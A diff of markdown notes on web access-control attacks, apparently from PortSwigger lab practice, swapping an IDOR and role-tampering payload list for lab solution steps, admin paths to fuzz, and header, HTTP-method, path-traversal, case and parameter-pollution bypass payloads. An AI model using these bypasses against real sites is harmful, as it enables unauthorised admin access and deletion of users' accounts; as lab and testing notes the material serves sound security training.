@@ -1,70 +1,130 @@
-# Access Control - Payload Reference
+# Access Control - Attack Techniques
 
-## IDOR (Insecure Direct Object Reference)
+## PortSwigger Lab Solutions
 
-### Numeric ID Tampering
-```
-GET /api/v1/users/123  →  GET /api/v1/users/1    # Try other user IDs
-GET /api/v1/users/123  →  GET /api/v1/users/2
-GET /api/v1/users/123  →  GET /api/v1/users/admin
-```
+### Lab 1: Unprotected admin functionality
+**Status**: SOLVED
+**Steps**:
+1. `GET /robots.txt` → Disallow: /administrator-panel
+2. `GET /administrator-panel` → Access admin without auth
+3. `GET /administrator-panel/delete?username=carlos` → Delete user
 
-### UUID/GUID Enumeration
-```
-# If UUIDs are used, check:
-# - API responses that leak other users' UUIDs
-# - Predictable UUID patterns (time-based v1)
-# - Referrer headers leaking UUIDs
-```
+**Key Lesson**: Check robots.txt for admin paths
 
-## Role/Privilege Escalation
-
-### Request Parameter Tampering
-```
-Cookie: role=admin
-Cookie: admin=true
-Cookie: isAdmin=1
-Hidden field: <input name="role" value="admin">
-JSON body: {"role": "admin", "isAdmin": true}
-```
-
-### PortSwigger Lab Approach
-```
-# Lab: User role controlled by request parameter
-1. Login as normal user
-2. Check request/response for role parameter
-3. Change role=administrator in cookie/param
+### Lab 2: User role controlled by request parameter
+**Status**: SOLVED (Lab #25)
+**Steps**:
+1. Login as wiener
+2. `GET /my-account?id=wiener` → Admin=false
+3. Change to `GET /my-account?id=wiener&Admin=true`
 4. Access admin panel
+
+### Lab 3: URL-based access control can be circumvented
+**Bypass methods**:
+```
+# X-Original-URL header
+GET / HTTP/1.1
+X-Original-URL: /admin
+
+# X-Rewrite-URL header
+GET / HTTP/1.1
+X-Rewrite-URL: /admin
 ```
 
-### HTTP Header Manipulation
+### Lab 4: Method-based access control bypass
+**Bypass methods**:
 ```
+# If GET /admin requires auth, try:
+POST /admin HTTP/1.1
+# or
+GET /admin HTTP/1.1 (without auth header)
+```
+
+## Common Admin Paths to Fuzz
+```
+/admin
+/administrator
+/admin-panel
+/administrator-panel
+/management
+/manage
+/panel
+/backend
+/console
+/dashboard
+/system
+/internal
+/private
+```
+
+## Discovery Techniques
+
+### robots.txt
+```
+GET /robots.txt
+# Often contains admin paths in Disallow
+```
+
+### Sitemap
+```
+GET /sitemap.xml
+# May contain admin URLs
+```
+
+### JavaScript Analysis
+```
+// Look for admin URLs in JS files
+/admin
+/api/admin
+/v1/admin
+```
+
+### Error Pages
+```
+# Trigger 403/401 to see admin paths in error messages
+```
+
+## Bypass Techniques
+
+### 1. Header-based bypass
+```
+X-Forwarded-For: 127.0.0.1
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
-X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
 ```
 
-## Method-Based Bypass
+### 2. HTTP method bypass
 ```
-GET /admin    → 403 Forbidden
-POST /admin   → 200 OK
-PUT /admin    → 200 OK
-OPTIONS /admin → Allow: GET, POST, PUT
+GET → POST → PUT → DELETE → PATCH → OPTIONS
 ```
 
-## URL Case Bypass
+### 3. Path traversal bypass
 ```
+/admin
 /Admin
-/ADMIN
-/adMin
+//admin
+/./admin
+/admin/.
+/admin..;/
+/.;/admin
+/admin;/
 ```
 
-## Path Bypass
+### 4. Case sensitivity bypass
 ```
-/admin/
-/admin/.
-/./admin
-/admin%20
-/admin#
-/admin..;
+/admin → /Admin → /ADMIN → /aDmIn
 ```
+
+### 5. Parameter pollution
+```
+/admin?role=user&role=admin
+```
+
+## Detection Checklist
+- [ ] robots.txt contains admin paths
+- [ ] Admin panel accessible without auth
+- [ ] URL-based access control headers bypass
+- [ ] HTTP method change bypasses auth
+- [ ] Path traversal bypasses restrictions
+- [ ] Case sensitivity bypasses filters
